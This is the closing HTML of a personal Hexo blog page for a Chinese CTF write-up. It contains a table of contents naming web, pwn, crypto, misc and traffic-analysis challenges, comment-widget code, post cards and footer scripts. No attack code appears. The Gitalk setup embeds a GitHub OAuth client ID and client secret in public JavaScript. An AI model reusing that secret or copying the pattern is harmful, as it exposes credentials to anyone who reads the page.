                </p>
            </div>
        </div>
    </div>

    
        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: '2a5e8e145ae3a20a52e2',
        clientSecret: 'e645b80a4a8ea094b8a09076f6c1a7d186a0903a',
        repo: 'yof3ng.github.io',
        owner: 'Yof3ng',
        admin: "Yof3ng",
        id: '2018-10-28T14-01-54',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>
    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
            <div class="article-badge left-badge text-color">本篇</div>
            <div class="card">
                <a href="/2018/10/28/wandoucup-ctf/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="wandoucup-ctf">
                        
                        <span class="card-title">wandoucup-ctf</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary">[TOC]
wandoucup-ctf
这两天在打一个稍微简单的CTF，写个writeup记录一下被虐的过程😭，总的来说这场小赛是个大杂烩，毕竟你懂的😏，作为做题者我们当然是有题做就ok的。
由于比赛后环境关闭，所以有的无图片展示，现有</div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-28
                            </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category" target="_blank">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>

                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Pwn/" target="_blank">
                        <span class="chip bg-color">Pwn</span>
                    </a>
                    
                    <a href="/tags/CTF/" target="_blank">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/流量分析/" target="_blank">
                        <span class="chip bg-color">流量分析</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">下一篇</div>
            <div class="card">
                <a href="/2018/10/27/灰色预测/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="灰色预测">
                        
                        <span class="card-title">灰色预测</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary">[TOC]
灰色预测
简单了解一下灰色预测这玩意儿。haha🙂

什么是灰色预测？
百度百科是这么说的：
灰色预测是就灰色系统所做的预测。所谓灰色系统是介于白色系统和黑箱系统之间的过渡系统。其具体的含义是:如果某一系统的全部信息已知为白色</div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-27
                            </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/算法/" class="post-category" target="_blank">
                                    算法
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/算法/" target="_blank">
                        <span class="chip bg-color">算法</span>
                    </a>
                    
                    <a href="/tags/数学模型/" target="_blank">
                        <span class="chip bg-color">数学模型</span>
                    </a>
                    
                    <a href="/tags/algorithm/" target="_blank">
                        <span class="chip bg-color">algorithm</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>
</div>
    </div>
    <div class="col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <h4>目录</h4>
            <div id="toc-content">
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#wandoucup-ctf"><span class="post-toc-text">wandoucup-ctf</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web"><span class="post-toc-text">web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web1-签到题"><span class="post-toc-text">web1-签到题</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web2-输入密码查看flag"><span class="post-toc-text">web2-输入密码查看flag</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web3-这真能传马？"><span class="post-toc-text">web3-这真能传马？</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web4-这真能注入？"><span class="post-toc-text">web4-这真能注入？</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web5-API"><span class="post-toc-text">web5-API</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web6-sweet-home"><span class="post-toc-text">web6-sweet home</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web附加题-atom"><span class="post-toc-text">web附加题-atom</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Pwn"><span class="post-toc-text">Pwn</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#pwn1–格式化字符串漏洞"><span class="post-toc-text">pwn1–格式化字符串漏洞</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#pwn2–栈溢出"><span class="post-toc-text">pwn2–栈溢出</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#pwn3–ret2syscall"><span class="post-toc-text">pwn3–ret2syscall</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Crypto"><span class="post-toc-text">Crypto</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Crypto1-我这密码忘了。。。"><span class="post-toc-text">Crypto1-我这密码忘了。。。</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Crypto2-二战时期的密码"><span class="post-toc-text">Crypto2-二战时期的密码</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Crypto3-被黑了，求密码"><span class="post-toc-text">Crypto3-被黑了，求密码</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Crypto4-出航了-出航啦！！"><span class="post-toc-text">Crypto4-出航了~出航啦！！</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Crypto5-IDC密码破解-未解出"><span class="post-toc-text">Crypto5-IDC密码破解(未解出)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Crypto6-超级密码"><span class="post-toc-text">Crypto6-超级密码</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Misc"><span class="post-toc-text">Misc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Misc1-会飞的狗狗"><span class="post-toc-text">Misc1-会飞的狗狗</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Misc2-文件类型分析"><span class="post-toc-text">Misc2-文件类型分析</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Misc3-真真假假分不清楚"><span class="post-toc-text">Misc3-真真假假分不清楚</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Misc4-诱人的音乐"><span class="post-toc-text">Misc4-诱人的音乐</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Misc5-神秘的文件名-未解出"><span class="post-toc-text">Misc5-神秘的文件名(未解出)</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#网络协议分析"><span class="post-toc-text">网络协议分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#网络协议分析1-数据包里有甜甜圈哦"><span class="post-toc-text">网络协议分析1-数据包里有甜甜圈哦~</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#网络协议分析2-嘿嘿嘿-未解出"><span class="post-toc-text">网络协议分析2-嘿嘿嘿(未解出)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#网络协议分析3-thief"><span class="post-toc-text">网络协议分析3-thief</span></a></li></ol></li></ol></li></ol>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        let tocLinks = $('#toc-content a');
        let setTocLinkActive = function (jqObj) {
            tocLinks.removeClass('active');
            jqObj.addClass('active');
        };

        // 监听点击TOC目录.
        tocLinks.on('click', function () {
            setTocLinkActive($(this));
        });

        let titleTopArr = [];
        $('#articleContent').find('h1, h2, h3, h4, h5, h6').each(function () {
            titleTopArr.push({'id': $(this).attr('id'), 'top': Math.round($(this).offset().top)});
        });
        let titleLen = titleTopArr.length;

        /* 监听滚动条.*/
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();

            /* add post toc fixed. */
            if (scroll > 240) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }

            /** 以下代码为动态设置TOC激活高亮的目录. */
            if (titleLen === 0) {
                return;
            }

            let firstTitleObj = titleTopArr[0];
            if (firstTitleObj.top > scroll) {
                return;
            } else if (firstTitleObj.top === scroll) {
                setTocLinkActive($('#toc-content a[href="#' + firstTitleObj.id + '"]'));
                return;
            }

            let lastTitleObj = titleTopArr[titleLen - 1];
            if (lastTitleObj.top <= scroll) {
                setTocLinkActive($('#toc-content a[href="#' + lastTitleObj.id + '"]'));
                return;
            }

            for (let i = 0; i < titleLen; i++) {
                if (titleTopArr[i].top > scroll) {
                    setTocLinkActive($('#toc-content a[href="#' + titleTopArr[i - 1].id + '"]'));
                    break;
                }
            }
        });
    });
</script>
    

</main>

<footer class="page-footer bg-color">
    <div class="container row center-align">
        <div class="col s12 m8 l8 copy-right">
            本站由&copy;<a href="https://yof3ng.github.io/" target="_blank">Yof3ng</a>采用
            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>的主题搭建.
        </div>
		
        <div class="col s12 m4 l4 social-link"><a href="https://github.com/yof3ng" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
    <i class="fa fa-github"></i>
</a>
<a href="mailto:yof3ng@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
    <i class="fa fa-envelope-open"></i>
</a>
<a href="#!" class="tooltipped" data-tooltip="QQ联系我: 877153299" data-position="top" data-delay="50">
    <i class="fa fa-qq"></i>
</a>

<a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
    <i class="fa fa-rss"></i>
</a>
</div>
    </div>
	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
	<div align=center>
		<span id="busuanzi_container_site_uv">
	  <a href="http://s11.flagcounter.com/more/zFT"><img src="https://s11.flagcounter.com/count/zFT/bg_FFFFFF/txt_000000/border_CCCCCC/columns_2/maxflags_10/viewers_0/labels_0/pageviews_0/flags_0/percent_0/" alt="Flag Counter" border="0"></a>
	</div>
</footer>

<div class="progress-bar"></div>


<!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title">搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input" autofocus="">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
</script>
<!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fa fa-angle-double-up"></i>
    </a>
</div>




<script src="/libs/materialize/js/materialize.min.js"></script>
<script src="/libs/masonry/masonry.pkgd.min.js"></script>
<script src="/libs/aos/aos.js"></script>
<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
<script src="/js/matery.js"></script>
<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
<script type="text/javascript" src="/js/fireworks.js"></script>
<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":100,"height":170},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>